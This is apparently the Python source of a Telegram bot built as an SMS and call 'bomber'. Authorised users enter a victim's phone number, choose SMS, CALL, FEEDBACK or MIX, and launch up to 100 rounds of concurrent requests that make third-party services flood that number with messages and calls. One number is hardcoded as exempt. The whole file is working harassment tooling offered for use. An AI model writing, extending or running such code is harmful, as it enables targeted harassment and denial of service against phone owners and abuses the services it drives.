import asyncio
from aiohttp import ClientSession
from aiogram import F, Router
from aiogram.filters import CommandStart
from aiogram.types import Message, CallbackQuery
from aiogram.fsm.state import StatesGroup, State
from aiogram.fsm.context import FSMContext
from app.attack.services import urls
from app.attack.feedback_services import feedback_urls
from .texts import text

import app.keyboards as kb  # Подключаем клавиатуры

import sys
import os

# Добавляем путь к корневой папке проекта, если необходимо
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from config import allowed_user_id



router = Router()
### Система регистрации  ###

# Состояния для добавления и удаления пользователей
class AdminStates(StatesGroup):
    add = State()
    remove = State()

import json
import os
from aiogram import Router, types, F
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command


# 📂 Путь к файлу с пользователями
USERS_FILE = "users.json"

# 🔄 Функция загрузки пользователей
def load_users():
    if not os.path.exists(USERS_FILE):  
        return {"allowed_users": []}  # Если файла нет, создаем пустой список
    with open(USERS_FILE, "r", encoding="utf-8") as file:
        return json.load(file)

# 💾 Функция для сохранения пользователей
def save_users(data):
    with open(USERS_FILE, "w", encoding="utf-8") as file:
        json.dump(data, file, indent=4, ensure_ascii=False)

# 📌 Клавиатура для админки
def admin_keyboard():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="➕ Добавить пользователя", callback_data="add_user")],
            [InlineKeyboardButton(text="➖ Удалить пользователя", callback_data="remove_user")],
        ]
    )

# ❌ Клавиатура для отмены
def cancel_keyboard():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_action")]
        ]
    )

# 🛠 Команда /admin (только для админов)
@router.message(Command("admin"))
async def admin_panel(message: types.Message):
    if message.from_user.id in allowed_user_id:
        await message.answer("🔧 *Панель администратора*", reply_markup=admin_keyboard(), parse_mode="Markdown")
    else:
        await message.answer("🚫 У вас нет доступа!")

# ➕ Добавление пользователя
@router.callback_query(F.data == "add_user")
async def add_user(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.edit_text("✍ *Отправьте ID пользователя, которого хотите добавить:*", 
                                     reply_markup=cancel_keyboard(), parse_mode="Markdown")
    await callback.answer()
    await state.set_state(AdminStates.add)

@router.message(AdminStates.add)
async def process_add_user(message: types.Message, state: FSMContext):
    user_id = str(message.text)  # Делаем ID строкой (избегаем проблем)
    users = load_users()

    if message.from_user.id in allowed_user_id:
        if user_id not in users["allowed_users"]:  # Сравниваем как строки
            users["allowed_users"].append(user_id)
            save_users(users)
            await message.answer(f"✅ *Пользователь {user_id} добавлен!*", parse_mode="Markdown")
        else:
            await message.answer(f"⚠️ *Пользователь {user_id} уже в списке!*", parse_mode="Markdown")
    else:
        await message.answer("🚫 У вас нет прав для этого действия!")

# ➖ Удаление пользователя
@router.callback_query(F.data == "remove_user")
async def remove_user(callback: types.CallbackQuery, state: FSMContext):
    await callback.message.edit_text("✍ *Отправьте ID пользователя, которого хотите удалить:*", 
                                     reply_markup=cancel_keyboard(), parse_mode="Markdown")
    await callback.answer()
    await state.set_state(AdminStates.remove)  # Устанавливаем состояние

@router.message(AdminStates.remove)
async def process_remove_user(message: types.Message, state: FSMContext):
    user_id = str(message.text)  # Делаем ID строкой
    users = load_users()

    if message.from_user.id in allowed_user_id:
        if user_id in users["allowed_users"]:  # Проверяем как строки
            users["allowed_users"].remove(user_id)
            save_users(users)
            await message.answer(f"❌ *Пользователь {user_id} удален!*", parse_mode="Markdown")
        else:
            await message.answer(f"⚠️ *Пользователь {user_id} не найден!*", parse_mode="Markdown")
    else:
        await message.answer("🚫 У вас нет прав для этого действия!")


# ❌ Отмена действия (изменяем сообщение)
@router.callback_query(F.data == "cancel_action")
async def cancel_action(callback: CallbackQuery, state: FSMContext):
    """Отменяет процесс добавления/удаления пользователей"""
    await state.clear()
    await callback.message.edit_text("Действие отменено ✔", reply_markup=admin_keyboard())
    await callback.answer()


# 📥 Добавление пользователя
async def process_add_user(message: types.Message):
    user_id = str(message.text)  # Делаем ID строкой (избегаем проблем)
    users = load_users()

    if message.from_user.id in allowed_user_id:
        if user_id not in users["allowed_users"]:  # Сравниваем как строки
            users["allowed_users"].append(user_id)
            save_users(users)
            await message.answer(f"✅ *Пользователь {user_id} добавлен!*", parse_mode="Markdown")
        else:
            await message.answer(f"⚠️ *Пользователь {user_id} уже в списке!*", parse_mode="Markdown")
    else:
        await message.answer("🚫 У вас нет прав для этого действия!")

# 🗑 Удаление пользователя
async def process_remove_user(message: types.Message):
    user_id = str(message.text)  # Делаем ID строкой
    users = load_users()

    if message.from_user.id in allowed_user_id:
        if user_id in users["allowed_users"]:  # Проверяем как строки
            users["allowed_users"].remove(user_id)
            save_users(users)
            await message.answer(f"❌ *Пользователь {user_id} удален!*", parse_mode="Markdown")
        else:
            await message.answer(f"⚠️ *Пользователь {user_id} не найден!*", parse_mode="Markdown")
    else:
        await message.answer("🚫 У вас нет прав для этого действия!")

def is_user_allowed(user_id: int) -> bool:
    """Проверяет, есть ли пользователь в списке разрешенных."""
    if not os.path.exists(USERS_FILE):  # Если файла нет, создаем пустой список
        return False
    
    with open(USERS_FILE, "r", encoding="utf-8") as file:
        users = json.load(file)

    return str(user_id) in users.get("allowed_users", [])  # Приводим к строке

#### Классы ####

class BomberState(StatesGroup):
    waiting_number = State()  # Ожидание номера телефона
    waiting_attack_type = State()  # Ожидание выбора типа атаки
    waiting_replay = State()  # Ожидание количества повторений
    bombing = State()  # Атака


#### Функции бомбера ####

success_count = 0
lock = asyncio.Lock()  # Для защиты обновления счётчика

async def request(session, url, attack_type):
    """Отправка запроса к сервису."""
    global success_count
    success_count = 0  # Сбрасываем перед началом атак
    try:
        if url['info']['attack'] in attack_type:
            async with session.request(
                url['method'], url['url'],
                params=url.get('params'),
                cookies=url.get('cookies'),
                headers=url.get('headers'),
                data=url.get('data'),
                json=url.get('json'),
                timeout=20
            ) as response:
                if 200 <= response.status < 300:  # Учитываем только успешные запросы
                    async with lock:
                        success_count += 1
                return await response.text()
    except Exception as e:
        print(f"Ошибка запроса: {e}")

async def async_attacks(number, attack_type, replay, stop_event):
    """Запускаем бомбардировку с возможностью остановки."""
    async with ClientSession() as session:
        if attack_type in {'MIX', 'FEEDBACK'}:
            services = urls(number) + feedback_urls(number)
        else:
            services = urls(number)

        for _ in range(int(replay)):
            if stop_event.is_set():  # Проверяем, нужно ли остановить
                return  # Выходим из функции сразу

            def get_attack_type(service):
                """Безопасно получаем тип атаки, если он есть"""
                return service.get('info', {}).get('attack')

            if attack_type == "MIX":
                tasks = [
                    asyncio.create_task(request(session, service, "SMS"))
                    for service in services if get_attack_type(service) == "SMS"
                ] + [
                    asyncio.create_task(request(session, service, "CALL"))
                    for service in services if get_attack_type(service) == "CALL"
                ] + [
                    asyncio.create_task(request(session, service, "FEEDBACK"))
                    for service in services if get_attack_type(service) == "SMS"
                ]
            else:
                tasks = [
                    asyncio.create_task(request(session, service, attack_type))
                    for service in services
                ]

            await asyncio.gather(*tasks)


async def start_async_attacks(number, attack_type, replay, state):
    """Запуск бомбера с контролем состояния."""
    stop_event = asyncio.Event()
    await state.update_data(stop_event=stop_event)  # Сохраняем stop_event в состояние
    await async_attacks(number, attack_type, replay, stop_event)

#### Хендлеры ####

@router.message(CommandStart())
async def cmd_start(message: Message):
    """Обрабатывает команду /start и показывает меню."""
    if is_user_allowed(message.from_user.id):
        await message.answer(text['greetings'], reply_markup=kb.main)
    else:
        await message.answer("💔 Простите но вы не являетесь представителем бета тестирования нашего приложения, ожидайте релиза", reply_markup=kb.get_id)

@router.callback_query(F.data == "chat_id")
async def give_id(callback: CallbackQuery):
    """Выдаём айди пользователя и username (если есть)"""
    chat_id = callback.from_user.id
    username = callback.from_user.username

    if username:
        text = f"🆔 <b>Ваш chat_id:</b> <code>{chat_id}</code>\n👤 <b>Ваш username:</b> @{username}"
    else:
        text = f"🆔 <b>Ваш chat_id:</b> <code>{chat_id}</code>\n❌ <i>Username отсутствует</i>"

    await callback.message.edit_text(text, parse_mode="HTML")  # Изменяем сообщение
    await callback.answer()

@router.callback_query(F.data == "startbomb")
async def start_bomber(callback: CallbackQuery, state: FSMContext):
    """Обработчик нажатия на кнопку 'Запустить бомбер'."""
    await callback.answer()
    if is_user_allowed(callback.from_user.id):
        await state.set_state(BomberState.waiting_number)
        await callback.message.edit_text("Введите номер телефона без знака [+]:")
    else:
        await callback.message.answer("💔 Простите но вы не являетесь представителем бета тестирования нашего приложения, ожидайте релиза", reply_markup=kb.get_id)

@router.message(BomberState.waiting_number)
async def process_number(message: Message, state: FSMContext):
    """Получение номера телефона."""
    if is_user_allowed(message.from_user.id):
        if message.text.isdigit() and not message.text == '998903706877':
            await state.update_data(number=message.text)
            await message.answer("Выберите тип атаки:", reply_markup=kb.attack_type)
            await state.set_state(BomberState.waiting_attack_type)
        else:
            await message.answer("🔒 Введите корректный номер, состоящий только из цифр.")
    else:
        await message.answer("💔 Простите но вы не являетесь представителем бета тестирования нашего приложения, ожидайте релиза", reply_markup=kb.get_id)

@router.callback_query(BomberState.waiting_attack_type)
async def process_attack_type(callback: CallbackQuery, state: FSMContext):
    """Выбор типа атаки (SMS, CALL и т. д.)."""
    attack_type = callback.data
    await state.update_data(attack_type=attack_type)
    await callback.message.edit_text("Введите количество повторений (до 100):")
    await state.set_state(BomberState.waiting_replay)

@router.message(BomberState.waiting_replay)
async def process_replay(message: Message, state: FSMContext):
    """Получение числа повторений атаки."""
    if message.text.isdigit():
        replay = int(message.text)
        if 1 <= replay <= 100:  # Ограничиваем число повторов
            await state.update_data(replay=replay)

            await message.answer(f"Бомбардировка начнётся с {replay} повторениями.\nЗапустить?", reply_markup=kb.start_stop_bomber)
            await state.set_state(BomberState.bombing)
        else:
            await message.answer("Введите число от 1 до 100.")
    else:
        await message.answer("Введите корректное число повторений.")

@router.callback_query(F.data == "start_attack", BomberState.bombing)
async def start_attack(callback: CallbackQuery, state: FSMContext):
    """Запускаем бомбардировку."""
    data = await state.get_data()
    number = data["number"]
    attack_type = data["attack_type"]
    replay = data["replay"]
    
    await callback.message.edit_text(f"🚀 Бомбардировка запущена!\n\n📞 Номер: {number}\n⚙️ Тип: {attack_type}\n🔁 Повторы: {replay}\n\nЧтобы остановить, нажмите кнопку ниже.", reply_markup=kb.stop_bomber)
    await start_async_attacks(number, attack_type, replay, state)  # Запускаем атаку
    await callback.message.answer(f"❤ Бомбардировка окончена, спасибо что вы с нами\n\n💌 Было успешно отправлено {success_count} сообщений", reply_markup=kb.main)

@router.callback_query(F.data == "stop_attack", BomberState.bombing)
async def stop_attack(callback: CallbackQuery, state: FSMContext):
    """Останавливаем бомбардировку."""
    data = await state.get_data()
    stop_event = data.get("stop_event")

    if stop_event:
        stop_event.set()  # Останавливаем атаки

    await callback.message.edit_text("Бомбардировка остановлена.", reply_markup=kb.main)
    await state.clear()
